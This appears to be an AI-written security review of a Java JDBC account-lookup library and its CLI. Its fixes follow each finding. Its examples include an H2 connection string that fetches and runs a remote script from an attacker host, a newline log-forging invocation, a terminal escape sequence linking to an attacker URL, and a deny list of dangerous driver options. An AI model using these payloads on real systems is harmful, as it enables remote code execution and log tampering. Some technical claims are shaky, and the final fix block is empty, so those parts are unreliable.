# Security Review: user-account lookup (`com.example.security` JDBC repository + demo CLI)

## 1. Executive Summary

This is a small, well-disciplined Java 17 component: a JDBC repository that resolves one username to one account row, an immutable record that carries the row, a wrapping runtime exception, and a command-line launcher. The headline question for this kind of code — can the untrusted username reach the SQL statement? — resolves cleanly: **no**. The query is a compile-time constant, the value only ever travels through `setString`, and the test suite pins that structurally with a `Proxy` double. I found no SQL injection, no deserialization sink, no command/file sink, no crypto implementation, and no hardcoded secrets.

The real weaknesses are all in the **launcher and the trust boundary around the library**, not in the query path. `Main` accepts a JDBC URL and a driver class name from argv and passes both straight to `Class.forName` and `DriverManager.getConnection`, which turns a "read-only demo" into an arbitrary-class-initialization and arbitrary-JDBC-URL sink for anyone who controls the invocation — the H2 `INIT=` connect-time statement hook makes that remote-code-execution-shaped on its own. The database password is taken as a command-line argument, the raw untrusted username is echoed back to the console *after* the code has already validated a trimmed copy of it (so the component's own anti-log-forging rule is defeated at the print statement), driver failure text is printed to the operator, and the not-found/found branches differ in exit code, which is an account-enumeration oracle for any caller the tool is exposed to.

Two findings are Low-plus-but-structural: the credential column is fetched on every identity lookup regardless of caller, and the component performs no audit logging at all — including on the failure path whose comment claims the control-character check exists to protect "the audit log".

Nine findings are recorded: 2 High, 4 Medium, 3 Low. None require a redesign; each is a bounded change at a named line. Everything I could positively confirm as correct is listed in section 6 rather than left as silence.

## 2. Scope

Reviewed in place at `/data/results-cyber/qwen/set_a/ruth/3/security` (not a git working tree — `git rev-parse` reports `fatal: not a git repository`, so history-based secret scanning was not applicable).

| File | Purpose | Security-relevant behaviour |
| --- | --- | --- |
| `src/com/example/security/UserRepository.java` (122 lines) | Resolves one username to `Optional<UserAccount>` over a caller-supplied `java.sql.Connection`. | Only SQL sink in the project: `SELECT_BY_USERNAME` constant (30-33) executed via `prepareStatement` + `setString` (60-62). Boundary validation of untrusted input (87-108): null, blank-after-`trim()`, length > 254, embedded control chars. Uniqueness probe via `setMaxRows(2)` (61, 69-75). Wraps `SQLException` without echoing input (78-79). Fetches `password_hash` unconditionally (119). No logging. |
| `src/com/example/security/UserAccount.java` (44 lines) | Immutable `record` holding one `users` row. | Carries `passwordHash` (21) as a component; `toString()` redacts it (40) but interpolates `username`/`email`/`fullName` raw (35-42). Javadoc prescribes a credential comparison method (9-13). |
| `src/com/example/security/UserRepositoryException.java` (21 lines) | Runtime exception for failed/ambiguous lookups. | Messages omit username, SQL text and driver detail; keeps `SQLException` as `cause` for server-side logs (16-19). `serialVersionUID` present (13). |
| `src/com/example/security/Main.java` (187 lines) | CLI launcher; in-memory H2 demo or connection to an operator-supplied database. | Trust boundary. argv options `--jdbc`, `--driver`, `--db-user`, `--db-password` (37-81). `Class.forName(driverClass)` (97). `DriverManager.getConnection` with caller URL (143, 145). Echoes raw username to stdout (123), account to stdout (128), `cause.getMessage()` to stderr (134). Exit codes 0/2/3/1 as an observable side channel (21, 116-136). Static-only DDL/seed SQL (153-174). |
| `test/com/example/security/UserRepositoryTest.java` (403 lines) | Framework-free `main` suite: 59 checks. | Holds the only executable evidence for the injection controls: 13 payload strings (100-110), table-integrity re-checks (114-115), `Proxy` double asserting the prepared SQL text and single bound parameter (240-254), redaction assertion (188-191). Fixture values only (`sa`/empty, `$2a$10$notarealhashvalue`); no production secret material. |
| `README.md` (202 lines) | Design rationale, run instructions, mutation-testing table. | Documents intent that the review must weigh: caller is deliberately not authorized (63), `--db-password` is a known process-list exposure (199), exit-code semantics (111). Not executable code; used as a claim source, each claim verified against source. |

Out of scope: the H2 driver jar (`/tmp/h2/h2.jar`), the JVM/platform itself, and any deployment wrapper that might invoke `Main` — though several findings' severity depends on that wrapper, which is stated per finding.

## 3. Skills Applied

The router skill (`review-code-for-security-vulnerabilities`) was followed in order: understand the code, grep sibling skill *names* against the behaviours this code actually exhibits, read only matched skills' `description` frontmatter, then apply matched skills one at a time.

- **`exploiting-sql-injection-vulnerabilities`** — applied to the whole query path: `UserRepository.java:30-33` (statement text), `:60-62` (prepare + bind), `:111-121` (row mapping), and the SQL in `Main.java:153-174` / the test fixtures. This is the primary skill for the component's purpose. Result: no finding; recorded in section 6.
- **`exploiting-insecure-deserialization`** — applied to the two `Serializable` types reachable across a trust boundary (`UserRepositoryException` with its `serialVersionUID`, `UserAccount` as a record) and to every type-name-in-string site. No `ObjectInputStream`, `readObject`, JNDI `InitialContext`, or XML decoder exists in the project, so no finding — but the type-name sink I did find (`--driver`) is out of that skill's stated scope, which is why it is reported under general knowledge below.
- **`testing-for-sensitive-data-exposure`** — applied per its Step 2 (responses returning more than necessary — its checklist names `password_hash` explicitly), its error-response check ("stack traces, database queries, internal paths, version info"), and its Step 6 (masking/redaction). Produced SEC-05 (driver detail to the operator), SEC-07 (credential column on an identity lookup), and confirmed the `toString()` redaction control.
- **`testing-for-email-header-injection`** — the library's only CRLF/record-separator-injection skill; applied by analogy to every site where the untrusted value is written into a line-oriented stream: `Main.java:123`, `:128`, and `UserAccount.toString()` `:35-42`. Produced SEC-04. Its `\x0a` / `%0a` payload shapes are exactly what the repository's control-character rule targets, and it was that skill's checklist that made me test the *leading*-separator case the rule misses.
- **`testing-api-authentication-weaknesses`** — applied to the lookup as an unauthenticated identity oracle: response-shape comparison between the found and not-found branches, absence of rate limiting/lockout, absence of any credential check. Produced SEC-06.
- **`testing-for-broken-access-control`** — applied to the question "who is allowed to read this record and its credential?" — `UserRepository.findByUsername` performs no authorization at all (also asserted at `README.md:63`). Folded into SEC-06 and SEC-07 rather than reported as a third overlapping finding on the same lines.
- **`performing-cryptographic-audit-of-application`** — applied to `UserAccount.java:6-13` and to the `$2a$10$…` fixture format. The component contains no hashing, verification, RNG, or cipher code, so there is no algorithm to audit; the only cryptographic content is *prescriptive guidance* in the credential-carrying type. Produced SEC-09.
- **`implementing-secret-scanning-with-gitleaks`** — applied to all sources and `README.md` for embedded credentials (`AKIA…`, `-----BEGIN`, `password=`, `secret`, `token`, `api_key`). Clean; the only credential-shaped strings are the `$2a$10$notarealhashvalue` fixture and the test's `sa`/empty H2 login. Not a git repository, so no history sweep was possible.
- **`exploiting-api-injection-vulnerabilities`** — checked for LDAP/XPath/NoSQL/script-injection sinks to see whether a skill beyond the SQL one applied. None exist; this component's only interpretation sink is SQL, already covered above.

**Reviewed against general OWASP/CWE knowledge because no library skill matched** (confirmed by grepping skill names for `jdbc`, `datasource`, `connection-string`, `classpath`, `Class.forName`, `reflection`, `argv`, `process list` — zero hits):

- **JDBC connect-string abuse** (`Main.java:104`, `140-146`) — reviewed against CWE-20 input validation and vendor-specific connect-time execution features (H2 `INIT=RUNSCRIPT`, `jdbc:h2:file:`/auto-server, PostgreSQL `options`/`sslmode`, MySQL `allowLoadLocalInfile`/`autoDeserialize`). Reported as SEC-02.
- **Caller-selected class loading** (`Main.java:95-102`) — CWE-470; `Class.forName` runs static initializers, so "just loading the driver" is code execution. Reported as SEC-01.
- **Secret in a process argument vector** (`Main.java:61-66`, `:145`) — CWE-214. Reported as SEC-03.
- **ANSI/OSC escape injection into terminal output** — CWE-150 alongside CWE-93; the closest skill covers only CRLF, and the escape-sequence half of SEC-04 has no skill coverage.
- **Missing security event logging** — CWE-778 / OWASP A09; library skills cover *analyzing* audit logs, not producing them. Reported as SEC-08.

## 4. Summary of Findings

| ID | Title | Severity | CWE | Location |
| --- | --- | --- | --- | --- |
| SEC-01 | Driver class name from argv is loaded reflectively | High | CWE-470 | `src/com/example/security/Main.java:97` |
| SEC-02 | Caller-supplied JDBC URL passed to `DriverManager` unvalidated | High | CWE-20 | `src/com/example/security/Main.java:143` |
| SEC-03 | Database password accepted as a command-line argument | Medium | CWE-214 | `src/com/example/security/Main.java:66` |
| SEC-04 | Raw untrusted username echoed to the console, bypassing the control-character rule | Medium | CWE-93 | `src/com/example/security/Main.java:123` |
| SEC-05 | Driver failure message printed to the operator | Medium | CWE-209 | `src/com/example/security/Main.java:134` |
| SEC-06 | Found/not-found asymmetry gives an account-enumeration oracle | Medium | CWE-204 | `src/com/example/security/Main.java:124` |
| SEC-07 | Credential column fetched on every identity lookup | Low | CWE-200 | `src/com/example/security/UserRepository.java:119` |
| SEC-08 | No audit logging of account lookups or lookup failures | Low | CWE-778 | `src/com/example/security/UserRepository.java:78` |
| SEC-09 | Credential-comparison guidance in `UserAccount` would produce broken verification | Low | CWE-327 | `src/com/example/security/UserAccount.java:12` |

## 5. Detailed Findings

### SEC-01: Driver class name from argv is loaded reflectively

- **Severity:** High
- **CWE:** CWE-470: Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection')
- **Location:** `src/com/example/security/Main.java:97`

**Vulnerable code:**

```java
// src/com/example/security/Main.java:95-102
        if (driverClass != null) {
            try {
                Class.forName(driverClass);
            } catch (ClassNotFoundException ex) {
                System.err.println("JDBC driver not on the classpath: " + driverClass);
                System.exit(1);
            }
        }
```

`driverClass` originates at `Main.java:48-55` as the raw value of `--driver` with no filtering beyond "a value was supplied".

**Why it is a problem:** `Class.forName` does not merely *look up* a class — with the default `initialize = true` it runs the target's static initializers and `<clinit>` under the launcher's own privileges. The attacker chooses the name, so any class reachable on the classpath becomes an execution primitive: static blocks in utility classes on a typical classpath touch the filesystem, open sockets, read environment variables, or spawn processes. The set is large and off-the-shelf (every JDBC driver present, every library with an eager static initializer), and the value is not constrained to a package prefix, so this is code selection, not driver selection. The `--help` text advertises the option (`Main.java:181`) as an ordinary feature, and nothing in the code or the README flags it as operator-only. Severity is High because exploitation needs no vulnerability elsewhere — only the ability to influence the invocation (a CI job template, a wrapper script, a support ticket asking the operator to re-run with `--driver X`, a config-management value). The `ClassNotFoundException` handler also confirms the guess to the caller, which turns the same line into a classpath-enumeration oracle.

**Fix:** Replace caller-chosen class names with an explicit allowlist, and prefer letting `DriverManager` auto-register drivers from `META-INF/services` so no name arrives from argv at all:

```java
// src/com/example/security/Main.java — replaces the block at 95-102
    /** The only driver classes this launcher will initialize. */
    private static final Set<String> APPROVED_DRIVERS = Set.of(
            "org.h2.Driver",
            "org.postgresql.Driver",
            "com.mysql.cj.jdbc.Driver");

    ...

        if (driverClass != null) {
            if (!APPROVED_DRIVERS.contains(driverClass)) {
                // Never name an unapproved class back to the caller: that is an oracle.
                System.err.println("driver is not in the approved driver list");
                System.exit(2);
                return;
            }
            try {
                Class.forName(driverClass);
            } catch (ClassNotFoundException ex) {
                System.err.println("approved JDBC driver not on the classpath: " + driverClass);
                System.exit(1);
                return;
            }
        }
```

Add `import java.util.Set;`. If arbitrary drivers are genuinely required, load them from a signed jar at a path fixed in configuration via a `URLClassLoader` with a restricted parent, never from a bare class name on the application classpath.

### SEC-02: Caller-supplied JDBC URL passed to `DriverManager` unvalidated

- **Severity:** High
- **CWE:** CWE-20: Improper Input Validation
- **Location:** `src/com/example/security/Main.java:143`

**Vulnerable code:**

```java
// src/com/example/security/Main.java:140-146
    private static Connection openConnection(String jdbcUrl, String dbUser, String dbPassword)
            throws SQLException {
        if (dbUser == null) {
            return DriverManager.getConnection(jdbcUrl);
        }
        return DriverManager.getConnection(jdbcUrl, dbUser, dbPassword);
    }
```

The call site is `Main.java:104`; `jdbcUrl` arrives unfiltered from `--jdbc` at `Main.java:40-47`.

**Why it is a problem:** A JDBC URL is not a destination, it is a bundle of driver behaviour flags, and the code hands the whole bundle to whoever invokes it. The README describes `--jdbc` as read-only usage — "the code only ever reads the `users` table" — but that claim constrains only *this program's statements*, not what the *driver* does at connect time. Concrete, well-documented abuses of an attacker-chosen URL:

- `jdbc:h2:...;INIT=RUNSCRIPT FROM 'http://attacker/evil.sql'` executes arbitrary SQL (and via `CREATE ALIAS … AS '…'`, arbitrary Java) during `getConnection`, before line 105 ever runs. The demo default is H2 (`Main.java:25`), so the H2 driver is on the classpath in the normal configuration, meaning the abused driver is already present.
- `jdbc:h2:file:/some/path` or `jdbc:h2:reqserver` writes files or talks to a server the caller picks; `-tcp` forms reach internal hosts (SSRF-shaped).
- Other vendors have their own connect-time sinks (MySQL `allowLoadLocalInfile`/`autoDeserialize`, PostgreSQL connection `options`).

There is no scheme allowlist, no host allowlist, no strip of option parameters, and no `DriverManager.setLoginTimeout`. Severity is High for the same reason as SEC-01: no other defect is required, and the outcome is code execution or file write, not merely data access. If `--jdbc` is guaranteed by deployment to be operator-typed and never influenced by a lower-trust party, this degrades to Medium — the code itself provides no such guarantee, so it cannot be assumed in review.

**Fix:** Never accept a connect string from argv. Resolve an environment *name* to a URL fixed in configuration, then re-validate structurally and refuse connect-time statement options:

```java
// src/com/example/security/Main.java — replaces openConnection (140-146)
    /** Approved connect endpoints, keyed by an environment name passed as --env. */
    private static final Map<String, String> APPROVED_JDBC = Map.of(
            "dev",  "jdbc:postgresql://db-dev.internal.example:5432/accounts",
            "prod", "jdbc:postgresql://db-prod.internal.example:5432/accounts");

    /** Connect-time options that let a driver run statements or load data at handshake. */
    private static final Set<String> FORBIDDEN_URL_OPTIONS =
            Set.of("init", "runscript", "shutdown", "vh", "allowloadlocalinfile",
                   "autodeserialize", "queryinterceptors", "statementinterceptors");

    private static Connection openConnection(String environment, String dbUser, String dbPassword)
            throws SQLException {
        String jdbcUrl = APPROVED_JDBC.get(environment);
        if (jdbcUrl == null) {
            throw new SQLException("unknown database environment: " + environment);
        }
        DriverManager.setLoginTimeout(5);
        for (String segment : jdbcUrl.substring(jdbcUrl.indexOf(';') + 1).split("[;&]")) {
            String key = segment.split("=", 2)[0].trim().toLowerCase(Locale.ROOT);
            if (FORBIDDEN_URL_OPTIONS.contains(key)) {
                throw new SQLException("approved connection carries a forbidden option");
            }
        }
        return DriverManager.getConnection(jdbcUrl, dbUser, dbPassword);
    }
```

Add `import java.util.Locale; import java.util.Map;`. If free-form URLs must remain supported, additionally disable the feature at the driver level (for H2, run with `-Dh2.aliases=false` and refuse any URL containing `INIT`), and use a pooled `DataSource` built from configuration rather than `DriverManager`.

### SEC-03: Database password accepted as a command-line argument

- **Severity:** Medium
- **CWE:** CWE-214: Revelation of Sensitive Information to an Unauthorized Actor (sensitive information in a process's argument vector)
- **Location:** `src/com/example/security/Main.java:66`

**Vulnerable code:**

```java
// src/com/example/security/Main.java:61-67
                case "--db-password" -> {
                    if (++i == args.length) {
                        System.err.println("missing value for --db-password");
                        System.exit(2);
                    }
                    dbPassword = args[i];
                }
```

`dbPassword` is then forwarded to the driver at `Main.java:145`.

**Why it is a problem:** `argv` is not private. On Linux any local user can read it from `/proc/<pid>/cmdline` or `ps -ef` for the lifetime of the JVM; the launcher can be a long-running process, so the exposure window is the whole run. The value is additionally written to the invoking user's shell history, to `auditd` `execve` records, to CI runner logs, and to any process-accounting or EDR telemetry that archives command lines. That converts a database credential into something readable by every other account on the host and by whoever collects the logs — precisely the class of exposure CWE-214 exists for. `README.md:199` acknowledges this ("visible in the process list; that is a demo shortcut, not a pattern for a service"), which is honest but not a mitigation: the option is advertised in `usage()` (`Main.java:183`) with no warning, so an operator who copy-pastes this launcher into a real deployment gets the exposure silently, and the README's own framing puts the burden on the reader.

**Fix:** Remove the value from argv — name an environment variable instead — and delete the option from the help text:

```java
// src/com/example/security/Main.java — replaces the "--db-password" case (61-67)
                case "--db-password-env" -> {
                    if (++i == args.length) {
                        System.err.println("missing value for --db-password-env");
                        System.exit(2);
                    }
                    String variable = args[i];
                    // The secret is named on the command line, never carried in it.
                    dbPassword = System.getenv(variable);
                    if (dbPassword == null || dbPassword.isEmpty()) {
                        System.err.println("environment variable " + variable + " is not set");
                        System.exit(2);
                        return;
                    }
                }
```

Correspondingly replace `usage()`'s line at `Main.java:183` with `--db-password-env NAME  name of the environment variable holding the password`. For a service, go further: fetch from the platform secret store or an unattended-auth mechanism (`pgpass` with mode 0600, Kerberos/SSPI, IAM auth), and never hold the password in a `String` longer than needed. Reading from stdin is an acceptable second choice if an env var does not fit the wrapper.

### SEC-04: Raw untrusted username echoed to the console, bypassing the control-character rule

- **Severity:** Medium
- **CWE:** CWE-93: Improper Neutralization of CRLF Sequences ('CRLF Injection'); secondarily CWE-150 (escape-sequence injection)
- **Location:** `src/com/example/security/Main.java:123`

**Vulnerable code:**

```java
// src/com/example/security/Main.java:120-125
            if (account.isEmpty()) {
                // Deliberately identical for "unknown name" and "name that looks like SQL":
                // the response must not reveal which form the attacker supplied.
                System.out.println("no account found for username: " + username);
                System.exit(3);
            }
```

**Why it is a problem:** The repository rejects control characters (`UserRepository.java:99-106`) and its comment states the reason: they "reach the audit log and would forge extra log lines (CRLF injection)". That control is applied to the wrong string. `normalizeAndValidate` checks `raw.trim()` (`:91`) and returns that trimmed copy; the caller never sees it. `Main.java:123` then prints `username` — the **original argv string**, untrimmed and unescaped. Because `String.trim()` removes every code unit `<= U+0020`, a *leading* control character is deleted from the copy that gets scanned, so it passes validation while surviving in the value that gets printed:

```text
java com.example.security.Main $'\n2026-09-15 INFO admin login accepted'
no account found for username: 
2026-09-15 INFO admin login accepted
```

One invocation, two output records, attacker-authored text in record two. The same arithmetic (0x1B = 27 `<= 0x20`) means a *leading* `ESC` also passes the scan, and the bytes that follow it are printable ASCII, so an OSC-8 hyperlink or screen-control sequence reaches the operator's terminal intact — `\x1b]8;;http://attacker.example\x07click\x07` renders as a clickable attacker URL in a modern terminal, and `\x1b[2J`-class sequences can rewrite what the operator believes the tool reported. Where the real damage lands: stdout of a CLI is normally *ingested* by something that treats a newline as a record boundary — a log shipper, a CI log, a SIEM ingestor, a support-ticket paste — which is exactly the audit-log forguring the design set out to prevent, now trivially available. Because the forged line can carry any timestamp and text, it can also be used to *hide* activity by making a legitimate lookup look like something else.

The same raw-value pattern exists on the success path: `Main.java:128` prints `found` whose `toString()` interpolates `username` (`UserAccount.java:36`) — that value came from the database, but nothing constrains the column's contents at write time, so a control byte stored through another path is echoed here too. Note the contrasting correct handling at `Main.java:115`, which prints only `ex.getMessage()` and never the input.

**Fix:** Escape control bytes on the output side, which is the only place that can neutralize the raw value, and do not depend on the validator's trimmed copy:

```java
// src/com/example/security/Main.java — print sites, replacing 123 and 128
            String shown = neutralizeForConsole(username);
            if (account.isEmpty()) {
                System.out.println("no account found for username: " + shown);
                System.exit(3);
            }

            UserAccount found = account.get();
            System.out.println("found " + neutralizeForConsole(found.toString()));
            System.out.println("active: " + found.isActive());

    /**
     * Renders untrusted text for a line-oriented stream: CR, LF, ESC, DEL and every other
     * control byte are escaped, so a value can never start a new record or drive a terminal.
     */
    private static String neutralizeForConsole(String untrusted) {
        StringBuilder out = new StringBuilder(untrusted.length());
        for (int i = 0; i < untrusted.length(); i++) {
            char c = untrusted.charAt(i);
            if (c < 0x20 || c == 0x7F) {
                out.append(String.format("\\u%04X", (int) c));
            } else {
                out.append(c);
            }
        }
        return out.toString();
    }
```

Cleaner structural alternative: have `findByUsername` return the canonical value it validated (or expose a public `canonical(String)`), so every consumer prints the *same* string that was checked, and no one is left holding the raw argv value. Either way, the scanner and the printer must be made to operate on one string.

### SEC-05: Driver failure message printed to the operator

- **Severity:** Medium
- **CWE:** CWE-209: Generation of Error Message Containing Sensitive Information
- **Location:** `src/com/example/security/Main.java:134`

**Vulnerable code:**

```java
// src/com/example/security/Main.java:131-137
        } catch (SQLException | UserRepositoryException ex) {
            System.err.println("account lookup failed: " + ex.getMessage());
            if (ex.getCause() != null) {
                System.err.println("cause: " + ex.getCause().getMessage());
            }
            System.exit(1);
        }
```

**Why it is a problem:** The library goes out of its way to keep driver detail out of its own messages: `UserRepositoryException`'s Javadoc states its messages "describe the failure without echoing the supplied username, the SQL text, or driver details", and that the `SQLException` cause "keeps the database detail for server-side logs". The launcher then unwraps that cause and prints it verbatim, discarding the distinction the type was designed to preserve. `SQLException.getMessage()` from real drivers is not user-facing text — it routinely carries the DBMS product and version, host and port, database name, authentication mechanism and policy, and in several drivers a re-echo of the connection string, sometimes including the password. Combined with SEC-02 (caller-controlled URL), the error path also becomes a way to probe internal hosts: connection-refused, host-unknown, and timeout messages differ, and the driver's own message names the resolved address, so an operator-supplied — or attacker-influenced — URL can be scanned against internal space through this print statement. Finally, this text lands in CI logs and ticketing, extending the exposure beyond the terminal.

**Fix:** Give the operator a stable, non-revealing message plus a correlation id; send the cause to the server-side log where the Javadoc always said it belonged:

```java
// src/com/example/security/Main.java — replaces the catch block (131-137)
        } catch (SQLException | UserRepositoryException ex) {
            String reference = Long.toHexString(System.nanoTime());
            LOGGER.log(Level.WARNING, "account lookup failed [ref=" + reference + "]", ex);
            // Driver detail — host, port, DBMS version, connection string — stays in the log.
            System.err.println("account lookup failed (reference " + reference + ")");
            System.exit(1);
        }
```

Add a `Logger` constant (with `import java.util.logging.Level; import java.util.logging.Logger;`) or the project's logging facade, and configure it to write to a protected log destination. Never interpolate `ex.getCause().getMessage()` into a user-visible stream.

### SEC-06: Found/not-found asymmetry gives an account-enumeration oracle

- **Severity:** Medium
- **CWE:** CWE-204: Observable Response Discrepancy
- **Location:** `src/com/example/security/Main.java:124`

**Vulnerable code:**

```java
// src/com/example/security/Main.java:120-130
            if (account.isEmpty()) {
                // Deliberately identical for "unknown name" and "name that looks like SQL":
                // the response must not reveal which form the attacker supplied.
                System.out.println("no account found for username: " + username);
                System.exit(3);
            }

            UserAccount found = account.get();
            System.out.println("found " + found);
            System.out.println("active: " + found.isActive());
            System.exit(0);
```

**Why it is a problem:** The comment at 121-122 gets its own goal half-right: both branches hide *whether the input looked like SQL*, which is why the injection payloads in the test suite all resolve to the same text. But the branches are not identical to each other, and the difference is the more useful oracle: exit code `3` versus `0` (`Main.java:21` and `README.md:111` both advertise this), plus a full record dump on one side and a one-line miss on the other. An exit status is the cheapest oracle that exists — a caller doesn't have to parse, compare, or time anything, just read `$?`. So the effective behaviour is "ask whether a username exists, for free, at any rate you like": a shell loop over a name list resolves the whole employee or service-account inventory from the exit codes, and the successful hits arrive with `email`, `fullName`, `status`, and `id` attached — a ready-made phishing and password-spraying target list, with `status` telling the attacker which accounts are live. Nothing in the path authenticates the caller or throttles it: `UserRepository.findByUsername` has no authorization check at all (`README.md:63` states this is deliberate) and there is no lockout, rate limit, or failed-lookup counter anywhere in the project. Severity is Medium rather than High because the oracle only matters if the command is reachable by a party the operator does not trust — which is exactly what happens the moment it is wrapped by a web endpoint, a chatbot command, a CI job parameter, or a self-service support tool, none of which the code guards against.

**Fix:** Make the two branches indistinguishable on every observable channel, and put any privileged view behind an explicit authorization check and throttling:

```java
// src/com/example/security/Main.java — replaces 120-130
            // One response shape for "exists" and "does not exist": same text, same exit code,
            // same work done. Existence is not a fact this command may confirm to an anonymous
            // caller; detailed output requires an authorized operator context.
            boolean reportDetails = operatorContext.authorized();
            System.out.println("account lookup complete");
            if (reportDetails && account.isPresent()) {
                UserAccount found = account.get();
                LOGGER.info(() -> "account found for lookup [actor="
                        + operatorContext.actor() + "]");
                System.out.println("found " + neutralizeForConsole(found.toString()));
            }
            System.exit(0);
        }
```

Remove the `3` exit code from the documented contract (`Main.java:21`, `README.md:111`) so the code and docs stop teaching the oracle, and keep the distinct code for real failures only. Enforce rate limiting, failed-lookup counting and lockout in the authentication/caller layer rather than here — the repository is the wrong place for that policy — but do not rely on their existence: if this lookup is exposed, it needs those controls in front of it and an audit record of who asked (see SEC-08).

### SEC-07: Credential column fetched on every identity lookup

- **Severity:** Low
- **CWE:** CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
- **Location:** `src/com/example/security/UserRepository.java:119`

**Vulnerable code:**

```java
// src/com/example/security/UserRepository.java:111-121
    private static UserAccount mapRow(ResultSet rows) throws SQLException {
        Timestamp createdAt = rows.getTimestamp("created_at");
        return new UserAccount(
                rows.getLong("id"),
                rows.getString("username"),
                rows.getString("email"),
                rows.getString("full_name"),
                rows.getString("status"),
                rows.getString("password_hash"),
                createdAt == null ? null : createdAt.toInstant());
    }
```

Driven by the single projection declared at `UserRepository.java:30-33`, which lists `password_hash` for every caller.

**Why it is a problem:** One query serves every consumer, and it always fetches the password hash — even for callers that only need identity, such as "is this account active?", the display path in `Main`, or an ownership check. That is a data-minimisation failure with real consequences in this specific design: `UserAccount` is a `record`, so the hash is reachable as `account.passwordHash()` from any code holding the value, with no visibility boundary; the record is `Serializable` by inheritance-free default plus a record's own semantics, so it can be handed to a cache, a session store, or a message queue and the credential goes along; a `record`'s generated `equals`/`hashCode`/`toString` all touch the component, and only `toString` was hand-fixed to redact (`UserAccount.java:40`) — that hand-fix is exactly the kind of single point that silently regresses when a field is copied into a DTO, a debug dump, a JSON serializer that reflects components, or an exception message. The blast radius is currently limited because `toString` redacts and nothing else logs the value, hence Low — the finding is about the credential being *available* to code that has no need for it, not about it being printed today.

**Fix:** Split the projections so the credential is fetched only by the authentication path, and make the credential-bearing type distinct so it can't be passed around by accident:

```java
// src/com/example/security/UserRepository.java — replaces SELECT_BY_USERNAME (30-33)
    /** Identity projection: every lookup caller needs this. No credential column. */
    static final String SELECT_IDENTITY_BY_USERNAME =
            "SELECT id, username, email, full_name, status, created_at"
          + "   FROM users"
          + "  WHERE username = ?";

    /** Credential projection: called only by the authentication path, immediately before hashing. */
    static final String SELECT_PASSWORD_HASH_BY_USERNAME =
            "SELECT password_hash FROM users WHERE username = ?";
```

```java
// src/com/example/security/UserRepository.java — new method alongside findByUsername
    /** Returns identity only; the caller can never see a credential through this path. */
    public Optional<UserIdentity> findIdentityByUsername(String username) { /* SELECT_IDENTITY_BY_USERNAME */ }

    /**
     * Returns the stored credential for password verification. Kept separate from identity
     * lookup so ordinary callers cannot obtain a hash, and named so that grep finds every
     * consumer. Log nothing from this method's return value.
     */
    public Optional<String> passwordHashForLogin(String username) { /* SELECT_PASSWORD_HASH_BY_USERNAME */ }
```

`mapRow` then stops reading column `password_hash` for identity results. Update the test at `UserRepositoryTest.java:73` (which currently asserts the hash maps onto `UserAccount`) to assert instead that the identity type has no credential accessor at all.

### SEC-08: No audit logging of account lookups or lookup failures

- **Severity:** Low
- **CWE:** CWE-778: Insufficient Logging
- **Location:** `src/com/example/security/UserRepository.java:78`

**Vulnerable code:**

```java
// src/com/example/security/UserRepository.java:78-80
        } catch (SQLException ex) {
            throw new UserRepositoryException("account lookup failed for the supplied username", ex);
        }
```

**Why it is a problem:** A grep of the source tree shows no logger, no appender, no logging call, and no logging dependency anywhere in `src/` — the only output the project produces is `System.out`/`System.err` from `Main`, which is per-invocation and vanishes unless the wrapper captures it. That means there is no record of who looked up which account, no record of lookup failures, and no record of the ambiguity refusal at `UserRepository.java:69-75` — which is a data-integrity alert about the `users` table and the single event in this component most worth persisting. Two consequences: SEC-06's enumeration oracle has no detection or rate-limiting signal behind it, so an inventory-harvesting loop is invisible; and a responder investigating an incident has nothing to reconstruct from, because the DB-side audit trail (if any) belongs to the shared service account, not to the requesting principal. The gap is not an oversight of the author's intent either — the comment at `UserRepository.java:102-103` justifies the control-character rule by saying such bytes "reach the audit log", yet no audit log is ever written, so the stated protection is guarding a sink that doesn't exist while the sink that does exist (`System.out`, see SEC-04) stays raw.

**Fix:** Emit a structured audit record on the paths that matter, naming the actor and the canonical username, and never the credential:

```java
// src/com/example/security/UserRepository.java — audit the failure and ambiguity paths
    private static final Logger LOGGER = Logger.getLogger(UserRepository.class.getName());

    ...

                if (rows.next()) {
                    // A duplicate username is a data-integrity finding: persist it before refusing.
                    LOGGER.severe("account lookup ambiguous for canonical username [username="
                            + canonical + "]: users.username uniqueness is violated");
                    throw new UserRepositoryException(
                            "account lookup is ambiguous: the username matched more than one row "
                          + "and users.username is expected to be unique");
                }
                return Optional.of(first);
            }
        } catch (SQLException ex) {
            LOGGER.log(Level.WARNING, "account lookup failed [username=" + canonical + "]", ex);
            throw new UserRepositoryException("account lookup failed for the supplied username", ex);
        }
```

Add `import java.util.logging.Level; import java.util.logging.Logger;` (or the project's facade). Log the `canonical` value — it is the validated string, so it cannot forge log records; if you log the raw value instead, apply SEC-04's escaping first. Include the authenticated actor/principal at the caller layer, and log successful lookups at `info` only if your retention and privacy posture allow it; failed-lookup counts per actor are what make SEC-06 detectable.

### SEC-09: Credential-comparison guidance in `UserAccount` would produce broken verification

- **Severity:** Low
- **CWE:** CWE-327: Use of a Broken or Risky Cryptographic Algorithm (risk arises from prescribed misuse)
- **Location:** `src/com/example/security/UserAccount.java:12`

**Vulnerable code:**

```java
// src/com/example/security/UserAccount.java:9-13
 * <p>{@code passwordHash} is carried because the authentication layer needs it to verify a
 * credential. It is deliberately kept out of {@link #toString()} so a debug print, a log line or
 * an exception message cannot leak a credential (and its cost factor) out of the process.
 * Compare it only with a constant-time check such as
 * {@code java.security.MessageDigest.isEqual}, and never log it.
```

**Why it is a problem:** This component does no hashing itself (`README.md:63-66` says so explicitly), so its cryptographic influence is entirely this instruction to the reader — and as written it is wrong for the hash format the project stores. The fixtures are bcrypt (`$2a$10$…`, `Main.java:163-171`), and bcrypt verification is not a comparison of two equal digests: the caller must re-derive the candidate's hash *using the stored hash as the salt/cost* (`BCrypt.checkpw(candidate, stored)`), which internally does the comparison. Instructing a developer to compare password material with `MessageDigest.isEqual` invites one of two outcomes: an implementation that never authenticates anyone (comparing a fresh hash against a stored hash produced with a different salt), or an ad-hoc hand-rolled scheme — hashing the candidate with a random or fixed salt and byte-comparing, which is the shape of the mistake that produced a decade of broken password checks. There is no code defect to point at today, which is why this is Low, but documentation on a credential-carrying type is part of the security surface, and this line is the file's only positive instruction about how to use its most sensitive field. The constant-time concern itself is valid — it is just already handled inside a correct `checkpw`, and it belongs to hash-based MACs, not to bcrypt.

**Fix:** Point at the library operation that actually performs verification, and state the property that matters:

```java
// src/com/example/security/UserAccount.java:9-13 — corrected guidance
 * <p>{@code passwordHash} is carried because the authentication layer needs it to verify a
 * credential. It is deliberately kept out of {@link #toString()} so a debug print, a log line or
 * an exception message cannot leak a credential (and its cost factor) out of the process.
